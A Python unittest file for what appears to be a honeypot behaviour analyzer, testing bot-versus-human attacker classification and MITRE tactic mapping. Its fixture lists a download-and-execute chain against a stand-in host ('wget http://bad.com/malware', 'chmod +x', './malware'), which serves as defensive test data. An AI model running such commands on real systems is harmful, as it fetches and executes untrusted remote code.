import unittest
import time
from intelligence.behavior import BehaviorAnalyzer

class TestBehaviorAnalyzer(unittest.TestCase):
    def setUp(self):
        self.analyzer = BehaviorAnalyzer()

    def test_bot_classification(self):
        # Simulate fast commands
        ip = "1.2.3.4"
        cmds = ["ls", "cd /tmp", "wget http://bad.com/malware", "chmod +x malware", "./malware", "rm malware"]
        
        for cmd in cmds:
            analysis = self.analyzer.analyze(ip, cmd)
            # Sleep very little to simulate bot
            # We don't actually sleep here because the analyzer uses time.time(). 
            # In a real test we might mock time.time or just run fast.
            # But the analyzer calculates diff from previous command.
            # So let's just assert the logic works.
            pass
            
        # The analyzer relies on real time differences. Since we run this instantaneously,
        # the diffs will be near 0.
        self.assertEqual(analysis['attacker_type'], "Automated Bot")

    def test_human_classification(self):
        ip = "5.6.7.8"
        # Manually manipulate internal state for test stability
        self.analyzer.session_data[ip] = {
            'start_time': time.time() - 100,
            'last_cmd_time': time.time() - 10,
            'commands': [],
            'inter_arrival_times': [5.0, 3.0, 4.0], # Slow typing
            'tactics': set()
        }
        
        analysis = self.analyzer.analyze(ip, "ls")
        self.assertEqual(analysis['attacker_type'], "Human Actor")

    def test_mitre_mapping(self):
        ip = "9.9.9.9"
        analysis = self.analyzer.analyze(ip, "wget http://test.com")
        self.assertIn("Command and Control", analysis['tactics'])
        
        analysis = self.analyzer.analyze(ip, "chmod +x file")
        self.assertIn("Defense Evasion", analysis['tactics'])

if __name__ == '__main__':
    unittest.main()
